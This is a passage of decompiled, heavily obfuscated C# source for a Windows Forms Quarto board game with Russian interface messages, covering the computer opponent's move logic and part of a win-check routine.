					flag2 = Form1.smethod_41((Control)(object)borderBox[num6, num3]) == Color.Blue;
					num = -1855788351;
					continue;
				case 15u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num6, num3]), num10 * size + 4, num11 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -138720404) ^ -1461818959;
					continue;
				case 14u:
					num10 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 287686245) ^ 0xD26500C);
					continue;
				case 13u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)(num2 * 1326543791) ^ -2030377675;
						continue;
					}
					num7 = 0;
					goto IL_01bb;
				case 12u:
					num6 = 0;
					num = ((int)num2 * -330811211) ^ 0x39B3986B;
					continue;
				case 11u:
					num = (int)((num2 * 1805927355) ^ 0x78C435C7);
					continue;
				case 10u:
					num7 = ((board[num11, num10] == null) ? 1 : 0);
					goto IL_01bb;
				case 9u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = -117420002;
						num14 = -117420002;
					}
					else
					{
						num13 = -1944082886;
						num14 = -1944082886;
					}
					num = num13 ^ ((int)num2 * -981815254);
					continue;
				}
				case 8u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1761175444) ^ -1246398461;
					continue;
				case 7u:
					flag3 = num3 < 4;
					num = -1945500729;
					continue;
				case 6u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num11 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -892568819) ^ 0xE932A49;
					continue;
				case 5u:
				{
					int num12;
					if (num6 < 4)
					{
						num = -2003127730;
						num12 = -2003127730;
					}
					else
					{
						num = -1529026481;
						num12 = -1529026481;
					}
					continue;
				}
				case 4u:
					num3 = 0;
					num = -1870469097;
					continue;
				case 3u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = 1760278992;
						num9 = 1760278992;
					}
					else
					{
						num8 = 127592924;
						num9 = 127592924;
					}
					num = num8 ^ ((int)num2 * -1904095242);
					continue;
				}
				case 2u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1126206288;
						num5 = 1126206288;
					}
					else
					{
						num4 = 1568745503;
						num5 = 1568745503;
					}
					num = num4 ^ (int)(num2 * 521939576);
					continue;
				}
				case 1u:
					num = ((int)num2 * -1485481468) ^ 0x260109A2;
					continue;
				case 0u:
					num3++;
					num = -1870469097;
					continue;
				default:
					return;
				case 25u:
					break;
				case 17u:
					return;
					IL_01bb:
					flag = (byte)num7 != 0;
					num = -1059087620;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0493: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c1: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		bool flag14 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		Graphics graphics_ = default(Graphics);
		int num24 = default(int);
		int num23 = default(int);
		int num22 = default(int);
		int num14 = default(int);
		int num15 = default(int);
		int num33 = default(int);
		int num10 = default(int);
		int num21 = default(int);
		int num11 = default(int);
		int num40 = default(int);
		int num38 = default(int);
		bool flag6 = default(bool);
		bool flag16 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num17 = default(int);
		int num16 = default(int);
		int num32 = default(int);
		bool flag13 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		Figurine[,] array3 = default(Figurine[,]);
		int num9 = default(int);
		bool flag7 = default(bool);
		bool flag9 = default(bool);
		bool flag = default(bool);
		int num35 = default(int);
		bool flag2 = default(bool);
		bool flag18 = default(bool);
		int num18 = default(int);
		int num19 = default(int);
		bool flag11 = default(bool);
		bool flag15 = default(bool);
		bool flag5 = default(bool);
		bool flag10 = default(bool);
		bool flag17 = default(bool);
		bool flag3 = default(bool);
		bool flag12 = default(bool);
		bool flag8 = default(bool);
		bool flag4 = default(bool);
		int num13 = default(int);
		while (true)
		{
			int num = 1094387791;
			while (true)
			{
				uint num2;
				int num12;
				int num29;
				int num20;
				int num43;
				switch ((num2 = (uint)num ^ 0x38E3576Bu) % 175u)
				{
				case 174u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -40071958) ^ -1836823370;
					continue;
				case 173u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1785865836) ^ -1920221523;
					continue;
				case 172u:
				{
					int num62;
					int num63;
					if (flag14)
					{
						num62 = -1566831066;
						num63 = -1566831066;
					}
					else
					{
						num62 = -697237345;
						num63 = -697237345;
					}
					num = num62 ^ (int)(num2 * 1552639922);
					continue;
				}
				case 171u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -242575615) ^ -1125648258;
					continue;
				case 170u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num24 + 0.05f) * (float)size, ((float)num23 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1389708929) ^ 0x4E02C503;
					continue;
				case 169u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1796911150;
					continue;
				case 168u:
					num22 = 0;
					num = 1402174579;
					continue;
				case 167u:
					Form1.smethod_30((Control)(object)pictureBox[num14, num15]);
					num = (int)(num2 * 2021755121) ^ -1719392837;
					continue;
				case 166u:
					num = (int)(num2 * 1141250565) ^ -536198407;
					continue;
				case 165u:
					num = ((int)num2 * -591802509) ^ 0x4424AB93;
					continue;
				case 164u:
					num33 = 0;
					num = 1884670772;
					continue;
				case 163u:
					storage[num14, num15] = null;
					num = (int)((num2 * 399314910) ^ 0x25DE6F6);
					continue;
				case 162u:
					num10 = num21;
					num = ((int)num2 * -1058193459) ^ -436760385;
					continue;
				case 161u:
					Form1.smethod_20(pictureBox[num14, num15], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num14, num15]);
					num = (int)((num2 * 1039089034) ^ 0x1781B3F8);
					continue;
				case 160u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.LimeGreen);
					num = ((int)num2 * -1459149343) ^ 0x1D59AEE6;
					continue;
				case 159u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1440677395) ^ 0x7CDACB8A);
					continue;
				case 158u:
					Form1.smethod_20(pictureBox[num21, num22], (Image)null);
					num = ((int)num2 * -981644405) ^ 0x4A5FFBE6;
					continue;
				case 157u:
					num = ((int)num2 * -78048306) ^ 0x2C766EFE;
					continue;
				case 156u:
					num11 = num22;
					num = (int)(num2 * 1762032165) ^ -2078640235;
					continue;
				case 155u:
					Form1.smethod_30((Control)(object)borderBox[num40, num38]);
					num = ((int)num2 * -2120440856) ^ -2017724193;
					continue;
				case 154u:
					num = 487881126;
					continue;
				case 153u:
					Form1.smethod_30((Control)(object)pictureBox[num21, num22]);
					num = ((int)num2 * -452143916) ^ 0x4C8C1341;
					continue;
				case 152u:
					flag6 = false;
					num = ((int)num2 * -309891116) ^ -1505046489;
					continue;
				case 151u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num15]), num24 * size + 4, num23 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1462746017) ^ 0x22148C95);
					continue;
				case 150u:
					num40 = Form1.smethod_33(rnd, 4);
					num = 379967472;
					continue;
				case 149u:
				{
					int num58;
					int num59;
					if (!flag16)
					{
						num58 = 810232913;
						num59 = 810232913;
					}
					else
					{
						num58 = 616914831;
						num59 = 616914831;
					}
					num = num58 ^ ((int)num2 * -1652433910);
					continue;
				}
				case 148u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 1749305480) ^ -1141801384;
					continue;
				case 147u:
					num6++;
					num = ((int)num2 * -412703016) ^ -233719026;
					continue;
				case 146u:
					num = (int)(num2 * 449394434) ^ -1572572997;
					continue;
				case 145u:
					array[num17, num16] = new Figurine(storage[num14, num15]);
					if (!Stop(array))
					{
						num = (int)((num2 * 49015999) ^ 0x29CC9FD2);
						continue;
					}
					num12 = 1;
					goto IL_0431;
				case 144u:
					num32++;
					num = ((int)num2 * -256844080) ^ -162380930;
					continue;
				case 143u:
				{
					int num48;
					int num49;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num48 = -1721200115;
						num49 = -1721200115;
					}
					else
					{
						num48 = -1909555942;
						num49 = -1909555942;
					}
					num = num48 ^ (int)(num2 * 1936135847);
					continue;
				}
				case 142u:
					flag13 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num22 * size + size / 2, (int)(((float)num21 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 1081496004;
					continue;
				case 141u:
					num = (int)((num2 * 942841196) ^ 0x1358D80C);
					continue;
				case 140u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array3);
					array2[num32, num9] = new Figurine(storage[num40, num38]);
					num = ((int)num2 * -86602382) ^ -1037436268;
					continue;
				case 139u:
					num = ((int)num2 * -933633587) ^ -2025768315;
					continue;
				case 138u:
					flag7 = Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Red;
					num = (int)((num2 * 605507838) ^ 0x471E3780);
					continue;
				case 137u:
					num10 = 0;
					num = ((int)num2 * -1061310693) ^ 0x2575FCAF;
					continue;
				case 136u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num6], bool_0: false);
					num = 1874149809;
					continue;
				case 135u:
					num24 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -586125419) ^ 0x164361D7;
					continue;
				case 134u:
					num21++;
					num = (int)(num2 * 1715316206) ^ -467489696;
					continue;
				case 133u:
				{
					int num36;
					int num37;
					if (flag9)
					{
						num36 = -948913098;
						num37 = -948913098;
					}
					else
					{
						num36 = -210352449;
						num37 = -210352449;
					}
					num = num36 ^ (int)(num2 * 1143243347);
					continue;
				}
				case 132u:
					flag = num35 < 4;
					num = 2082524068;
					continue;
				case 131u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -160003219) ^ 0x300F8C68;
					continue;
				case 130u:
				{
					int num27;
					int num28;
					if (flag7)
					{
						num27 = 1120311316;
						num28 = 1120311316;
					}
					else
					{
						num27 = 28266388;
						num28 = 28266388;
					}
					num = num27 ^ ((int)num2 * -1569169122);
					continue;
				}
				case 129u:
					num = (int)((num2 * 908530480) ^ 0x877E0B2);
					continue;
				case 128u:
					num = ((int)num2 * -181154286) ^ 0x37DAEE7;
					continue;
				case 127u:
					num14 = num5;
					num = (int)((num2 * 1557365420) ^ 0x4C9D4218);
					continue;
				case 126u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = 1877365644;
						num8 = 1877365644;
					}
					else
					{
						num7 = 822132396;
						num8 = 822132396;
					}
					num = num7 ^ (int)(num2 * 1544175556);
					continue;
				}
				case 125u:
					num = (int)(num2 * 2674201) ^ -1469944072;
					continue;
				case 124u:
				{
					int num66;
					int num67;
					if (flag18)
					{
						num66 = 1397471128;
						num67 = 1397471128;
					}
					else
					{
						num66 = 1534520816;
						num67 = 1534520816;
					}
					num = num66 ^ ((int)num2 * -169273039);
					continue;
				}
				case 123u:
					num5++;
					num = (int)(num2 * 1516569458) ^ -930351063;
					continue;
				case 122u:
					num18 = 0;
					num19 = 0;
					num21 = 0;
					num = (int)(num2 * 1084533966) ^ -603845293;
					continue;
				case 121u:
				{
					int num64;
					int num65;
					if (flag11)
					{
						num64 = -2130529963;
						num65 = -2130529963;
					}
					else
					{
						num64 = -1912456166;
						num65 = -1912456166;
					}
					num = num64 ^ ((int)num2 * -1221690806);
					continue;
				}
				case 120u:
				{
					int num60;
					int num61;
					if (flag13)
					{
						num60 = -1630953186;
						num61 = -1630953186;
					}
					else
					{
						num60 = -449353256;
						num61 = -449353256;
					}
					num = num60 ^ (int)(num2 * 536895513);
					continue;
				}
				case 119u:
				{
					int num56;
					int num57;
					if (flag15)
					{
						num56 = 1516026985;
						num57 = 1516026985;
					}
					else
					{
						num56 = 256155840;
						num57 = 256155840;
					}
					num = num56 ^ ((int)num2 * -1110031601);
					continue;
				}
				case 118u:
					flag5 = num21 < 4;
					num = 1595543041;
					continue;
				case 117u:
					Form1.smethod_7((Control)(object)pictureBox[num35, num33], bool_0: true);
					num = 1088313777;
					continue;
				case 116u:
					num = (int)((num2 * 1082536170) ^ 0x46876326);
					continue;
				case 115u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1982950489) ^ -447344260;
					continue;
				case 113u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -932132498) ^ -55272775;
					continue;
				case 112u:
					Form1.smethod_5((Control)(object)borderBox[num14, num15], Color.White);
					num = ((int)num2 * -991229280) ^ -1528147800;
					continue;
				case 111u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 744517388) ^ 0x13110F57);
					continue;
				case 110u:
				{
					int num54;
					int num55;
					if (!flag10)
					{
						num54 = 1902995244;
						num55 = 1902995244;
					}
					else
					{
						num54 = 1827811625;
						num55 = 1827811625;
					}
					num = num54 ^ (int)(num2 * 1086664361);
					continue;
				}
				case 109u:
					num = ((int)num2 * -2053935028) ^ -53928849;
					continue;
				case 108u:
					num14 = 0;
					num15 = 0;
					num5 = 0;
					num = (int)(num2 * 1258053172) ^ -1368340665;
					continue;
				case 107u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 837958673) ^ 0x5BC69AC2);
					continue;
				case 106u:
					flag18 = num5 < 4;
					num = 476763678;
					continue;
				case 105u:
					num = (int)(num2 * 1352663080) ^ -130381320;
					continue;
				case 104u:
					num38 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1104454096) ^ 0x7FDD8A13;
					continue;
				case 103u:
					num18 = num21;
					num19 = num22;
					num = ((int)num2 * -955174463) ^ -1550110514;
					continue;
				case 102u:
					num15 = num6;
					num = ((int)num2 * -1614734857) ^ 0x329C7D9B;
					continue;
				case 100u:
					num = ((int)num2 * -1953840603) ^ 0x21F2B8A1;
					continue;
				case 99u:
					num = 1349547973;
					continue;
				case 98u:
				{
					int num52;
					int num53;
					if (flag17)
					{
						num52 = -907258386;
						num53 = -907258386;
					}
					else
					{
						num52 = -1109929389;
						num53 = -1109929389;
					}
					num = num52 ^ ((int)num2 * -198525271);
					continue;
				}
				case 97u:
					Form1.smethod_15(timer1);
					num = 1013272833;
					continue;
				case 96u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 46057710) ^ -38272187;
					continue;
				case 95u:
					num = ((int)num2 * -1168442289) ^ -1555979329;
					continue;
				case 94u:
					num = (int)(num2 * 1673801473) ^ -730758072;
					continue;
				case 93u:
				{
					int num50;
					int num51;
					if (!flag3)
					{
						num50 = 842991780;
						num51 = 842991780;
					}
					else
					{
						num50 = 72596157;
						num51 = 72596157;
					}
					num = num50 ^ ((int)num2 * -196886810);
					continue;
				}
				case 92u:
					Form1.smethod_47(1000);
					num = (int)((num2 * 444477999) ^ 0x5AD994E0);
					continue;
				case 91u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1942290023) ^ 0x28AEEEFF);
					continue;
				case 90u:
					if (num40 == num14)
					{
						num = (int)((num2 * 330235709) ^ 0x32045C90);
						continue;
					}
					goto IL_0af9;
				case 89u:
					flag16 = board[num17, num16] == null;
					num = 519148009;
					continue;
				case 88u:
					num = 672760120;
					continue;
				case 87u:
					flag12 = array3[num32, num9] == null;
					num = 1411788338;
					continue;
				case 86u:
					Paint_Board();
					num = (int)((num2 * 849026039) ^ 0x5A97672D);
					continue;
				case 85u:
					flag15 = num6 < 4;
					num = 1294259399;
					continue;
				case 84u:
					num6 = 0;
					num = 1377387879;
					continue;
				case 83u:
					num = (int)((num2 * 1998408504) ^ 0x1F8EBADC);
					continue;
				case 82u:
					flag14 = num9 < 4;
					num = 1617038815;
					continue;
				case 81u:
					num = ((int)num2 * -1646675423) ^ 0xD6512B5;
					continue;
				case 80u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1263153018) ^ 0x488BCDE2;
					continue;
				case 79u:
					num = ((int)num2 * -685849844) ^ 0x297B6290;
					continue;
				case 78u:
				{
					int num46;
					int num47;
					if (flag8)
					{
						num46 = 546155559;
						num47 = 546155559;
					}
					else
					{
						num46 = 1280705973;
						num47 = 1280705973;
					}
					num = num46 ^ ((int)num2 * -1845021005);
					continue;
				}
				case 77u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num17 = 0;
					num = ((int)num2 * -1040254652) ^ -2142515994;
					continue;
				case 76u:
					board[num17, num16] = new Figurine(storage[num14, num15]);
					num = (int)((num2 * 719615680) ^ 0x24FF0972);
					continue;
				case 75u:
					num16 = 0;
					num = 1406799897;
					continue;
				case 74u:
					num35++;
					num = (int)(num2 * 227901564) ^ -1256867848;
					continue;
				case 73u:
					array3[num23, num24] = new Figurine(storage[num14, num15]);
					num = ((int)num2 * -684248099) ^ 0x54952C45;
					continue;
				case 72u:
					num16++;
					num = 1092565970;
					continue;
				case 71u:
				{
					int num45;
					if (num17 < 4)
					{
						num = 1943981195;
						num45 = 1943981195;
					}
					else
					{
						num = 714223660;
						num45 = 714223660;
					}
					continue;
				}
				case 70u:
					num = 1352553797;
					continue;
				case 69u:
					num = 144196740;
					continue;
				case 68u:
					num = ((int)num2 * -1791496733) ^ 0x227C9EF2;
					continue;
				case 67u:
					num23 = Form1.smethod_33(rnd, 4);
					num = 928128198;
					continue;
				case 66u:
				{
					int num44;
					if (num16 >= 4)
					{
						num = 1421821960;
						num44 = 1421821960;
					}
					else
					{
						num = 2067855236;
						num44 = 2067855236;
					}
					continue;
				}
				case 65u:
					num = 1180850197;
					continue;
				case 64u:
					num = (int)(num2 * 1703899018) ^ -438948732;
					continue;
				case 63u:
					num = (int)((num2 * 1843569841) ^ 0x3383F099);
					continue;
				case 62u:
					Form1.smethod_20(pictureBox[num14, num15], (Image)null);
					num = (int)(num2 * 737749077) ^ -1415973878;
					continue;
				case 61u:
					if (storage[num40, num38] != null)
					{
						num = ((int)num2 * -1046457616) ^ 0x60AE6C4C;
						continue;
					}
					goto IL_0aed;
				case 60u:
				{
					int num41;
					int num42;
					if (flag12)
					{
						num41 = 1359330843;
						num42 = 1359330843;
					}
					else
					{
						num41 = 1323355813;
						num42 = 1323355813;
					}
					num = num41 ^ ((int)num2 * -552421879);
					continue;
				}
				case 59u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 1292328071) ^ -1647825218;
					continue;
				case 58u:
					num32 = 0;
					num = (int)((num2 * 1700223653) ^ 0x58D9C5A0);
					continue;
				case 57u:
					Form1.smethod_5((Control)(object)borderBox[num40, num38], Color.Blue);
					num = ((int)num2 * -1987373895) ^ -899916103;
					continue;
				case 56u:
					num = ((int)num2 * -1560886084) ^ 0x18BA115A;
					continue;
				case 55u:
					num = (int)((num2 * 547925076) ^ 0x7E1CB1F8);
					continue;
				case 54u:
					Form1.smethod_5((Control)(object)borderBox[num21, num22], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num21, num22]);
					num = (int)(num2 * 1394451532) ^ -122363956;
					continue;
				case 53u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num16 + 0.05f) * (float)size, ((float)num17 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 766493126) ^ -36430965;
					continue;
				case 52u:
					num = ((int)num2 * -1236860731) ^ 0x50D5B5BF;
					continue;
				case 51u:
					num = ((int)num2 * -2076583653) ^ 0x152927BE;
					continue;
				case 50u:
					num = ((int)num2 * -341757419) ^ -1062828293;
					continue;
				case 49u:
					num9++;
					num = 18634127;
					continue;
				case 48u:
					flag9 = Form1.smethod_41((Control)(object)borderBox[num21, num22]) == Color.Blue;
					num = ((int)num2 * -1131128120) ^ 0x49350A2B;
					continue;
				case 47u:
				{
					int num39;
					if (num22 >= 4)
					{
						num = 1130943200;
						num39 = 1130943200;
					}
					else
					{
						num = 759102808;
						num39 = 759102808;
					}
					continue;
				}
				case 46u:
					num = (int)(num2 * 1181263589) ^ -1753890267;
					continue;
				case 45u:
					num35 = 0;
					num = (int)(num2 * 1437796969) ^ -1805430147;
					continue;
				case 44u:
					if (num38 == num15)
					{
						goto IL_0aed;
					}
					goto IL_0af9;
				case 43u:
					num22++;
					num = 1956299830;
					continue;
				case 42u:
					num = ((int)num2 * -1005541326) ^ -553071349;
					continue;
				case 41u:
					Form1.smethod_30((Control)(object)borderBox[num14, num15]);
					num = (int)((num2 * 1756256385) ^ 0x7340A412);
					continue;
				case 40u:
					num33++;
					num = ((int)num2 * -1979581625) ^ 0x666BBF95;
					continue;
				case 39u:
					flag11 = Stop(array2);
					num = ((int)num2 * -1726439890) ^ -1572502009;
					continue;
				case 38u:
					if (!Stop(board))
					{
						num = (int)(num2 * 299674716) ^ -919632701;
						continue;
					}
					num29 = 0;
					goto IL_10b3;
				case 37u:
					num = 1557561154;
					continue;
				case 36u:
					num = (int)(num2 * 121128141) ^ -1171654036;
					continue;
				case 35u:
				{
					int num34;
					if (num33 < 4)
					{
						num = 1900484976;
						num34 = 1900484976;
					}
					else
					{
						num = 212278318;
						num34 = 212278318;
					}
					continue;
				}
				case 34u:
					num = ((int)num2 * -1814430465) ^ 0x6A586700;
					continue;
				case 33u:
					flag8 = num32 < 4;
					num = 1577052459;
					continue;
				case 32u:
				{
					int num30;
					int num31;
					if (flag4)
					{
						num30 = -2119289121;
						num31 = -2119289121;
					}
					else
					{
						num30 = -1285524683;
						num31 = -1285524683;
					}
					num = num30 ^ (int)(num2 * 692674456);
					continue;
				}
				case 31u:
					num29 = ((!Standoff(board)) ? 1 : 0);
					goto IL_10b3;
				case 30u:
					flag6 = true;
					num = (int)(num2 * 144852861) ^ -156324916;
					continue;
				case 29u:
					if (!flag6)
					{
						num = ((int)num2 * -1189430904) ^ -1001377486;
						continue;
					}
					goto IL_119c;
				case 28u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1990687190) ^ -1275664499;
					continue;
				case 27u:
				{
					int num25;
					int num26;
					if (flag5)
					{
						num25 = 1750534959;
						num26 = 1750534959;
					}
					else
					{
						num25 = 989929777;
						num26 = 989929777;
					}
					num = num25 ^ ((int)num2 * -1494931984);
					continue;
				}
				case 26u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					num = ((int)num2 * -886614710) ^ 0x271B95B;
					continue;
				case 25u:
					num17++;
					num = (int)(num2 * 688104785) ^ -877152977;
					continue;
				case 24u:
					num = (int)(num2 * 50678633) ^ -815058003;
					continue;
				case 23u:
					storage[num14, num15] = null;
					flag4 = Standoff(board);
					num = ((int)num2 * -1858238927) ^ -257677465;
					continue;
				case 22u:
					num = ((int)num2 * -40024437) ^ 0x7571F600;
					continue;
				case 21u:
					flag2 = Standoff(board);
					num = 1603134809;
					continue;
				case 20u:
					num13 = 0;
					num = ((int)num2 * -465412735) ^ 0x635AA705;
					continue;
				case 19u:
					board[num23, num24] = new Figurine(storage[num14, num15]);
					num = (int)(num2 * 1043236958) ^ -1056564395;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1333477838) ^ 0x7E76400E;
					continue;
				case 17u:
					Form1.smethod_5((Control)(object)borderBox[num14, num15], Color.White);
					num = (int)((num2 * 363546909) ^ 0x463EAA57);
					continue;
				case 16u:
					Form1.smethod_30((Control)(object)borderBox[num14, num15]);
					num = (int)(num2 * 379608440) ^ -733614198;
					continue;
				case 15u:
					num = (int)((num2 * 89782834) ^ 0x21220BA4);
					continue;
				case 14u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 934422295) ^ -96774133;
					continue;
				case 13u:
					num11 = 0;
					num = (int)(num2 * 1594165133) ^ -1276460356;
					continue;
				case 12u:
					num = (int)((num2 * 561407149) ^ 0x5D0464A7);
					continue;
				case 11u:
					num = (int)((num2 * 1820166245) ^ 0x465662B7);
					continue;
				case 10u:
					flag3 = board[num23, num24] != null;
					num = (int)(num2 * 676838661) ^ -1451664397;
					continue;
				case 9u:
					if (num13 >= 9)
					{
						num = 2055870986;
						num20 = 2055870986;
						continue;
					}
					goto IL_119c;
				case 8u:
					board[num18, num19] = new Figurine(storage[num10, num11]);
					num = ((int)num2 * -1475653285) ^ 0x22F138AC;
					continue;
				case 7u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num15]), num16 * size + 4, num17 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1737274094) ^ 0x6CB8EDDE);
					continue;
				case 6u:
					num13++;
					num = 465291244;
					continue;
				case 5u:
					num12 = (Standoff(array) ? 1 : 0);
					goto IL_0431;
				case 4u:
					storage[num10, num11] = null;
					num = (int)(num2 * 1850380201) ^ -435348155;
					continue;
				case 3u:
					num9 = 0;
					num = 275066138;
					continue;
				case 2u:
					num = ((int)num2 * -71660344) ^ -214251452;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1541107063;
						num4 = 1541107063;
					}
					else
					{
						num3 = 871660422;
						num4 = 871660422;
					}
					num = num3 ^ (int)(num2 * 1401879748);
					continue;
				}
				case 0u:
					num = ((int)num2 * -465563974) ^ 0x331D077B;
					continue;
				default:
					return;
				case 114u:
					break;
				case 101u:
					return;
					IL_119c:
					num = 984445634;
					num20 = 984445634;
					continue;
					IL_10b3:
					flag10 = (byte)num29 != 0;
					num = 1174118624;
					continue;
					IL_0aed:
					num = 1310022386;
					num43 = 1310022386;
					continue;
					IL_0af9:
					num = 1823478951;
					num43 = 1823478951;
					continue;
					IL_0431:
					flag17 = (byte)num12 != 0;
					num = 1795122444;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num7 = default(int);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -1032607140;
			while (true)
			{
				uint num2;
				int num8;
				int num11;
				switch ((num2 = (uint)num ^ 0xD28BDD2Bu) % 77u)
				{
				case 76u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 812674219) ^ 0x298316E7);
						continue;
					}
					goto IL_0033;
				case 75u:
				{
					int num36;
					int num37;
					if (mem[1, 1] != null)
					{
						num36 = 1076356307;
						num37 = 1076356307;
					}
					else
					{
						num36 = 504103289;
						num37 = 504103289;
					}
					num = num36 ^ ((int)num2 * -1695827543);
					continue;
				}
				case 74u:
				{
					int num38;
					int num39;
					if (mem[num7, 1].Dark == mem[num7, 2].Dark)
					{
						num38 = 2079091615;
						num39 = 2079091615;
					}
					else
					{
						num38 = 1852799286;
						num39 = 1852799286;
					}
					num = num38 ^ (int)(num2 * 563659246);
					continue;
				}
				case 73u:
				{
					int num47;
					int num48;
					if (mem[num7, 1].Square != mem[num7, 2].Square)
					{
						num47 = -1779863253;
						num48 = -1779863253;
					}
					else
					{
						num47 = -660252748;
						num48 = -660252748;
					}
					num = num47 ^ (int)(num2 * 1298089977);
					continue;
				}
				case 72u:
					num = (int)((num2 * 831007869) ^ 0x3C98B8E);
					continue;
				case 71u:
					num7 = 0;
					num = ((int)num2 * -1152332185) ^ -869125591;
					continue;
				case 70u:
				{
					int num18;
					int num19;
					if (mem[num7, 1].Big != mem[num7, 2].Big)
					{
						num18 = -2098353471;
						num19 = -2098353471;
					}
					else
					{
						num18 = -1826879530;
						num19 = -1826879530;
					}
					num = num18 ^ ((int)num2 * -1529950060);
					continue;
				}
				case 69u:
				{
					int num64;
					int num65;
					if (mem[1, num7].Big != mem[2, num7].Big)
					{
						num64 = -993272305;
						num65 = -993272305;
					}
					else
					{
						num64 = -370501812;
						num65 = -370501812;
					}
					num = num64 ^ (int)(num2 * 269115812);
					continue;
				}
				case 68u:
				{
					int num16;
					int num17;
					if (mem[num7, 1].Point == mem[num7, 2].Point)
					{
						num16 = -1166613318;
						num17 = -1166613318;
					}
					else
					{
						num16 = -1080989040;
						num17 = -1080989040;
					}
					num = num16 ^ ((int)num2 * -767276111);
					continue;
				}
				case 67u:
				{
					int num69;
					if (mem[num7, 0].Dark == mem[num7, 1].Dark)
					{
						num = -61474205;
						num69 = -61474205;
					}
					else
					{
						num = -963988026;
						num69 = -963988026;
					}
					continue;
				}
				case 66u:
					if (mem[1, num7].Square == mem[2, num7].Square)
					{
						num = ((int)num2 * -162151898) ^ 0x48B60263;
						continue;
					}
					goto IL_0246;
				case 65u:
				{
					int num43;
					int num44;
					if (mem[0, 0] != null)
					{
						num43 = -1321628246;
						num44 = -1321628246;
					}
					else
					{
						num43 = -791386032;
						num44 = -791386032;
					}
					num = num43 ^ (int)(num2 * 1097068464);
					continue;
				}
				case 64u:
				{
					int num28;
					int num29;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num28 = 411635388;
						num29 = 411635388;
					}
					else
					{
						num28 = 87505782;
						num29 = 87505782;
					}
					num = num28 ^ ((int)num2 * -1152401612);
					continue;
				}
				case 63u:
				{
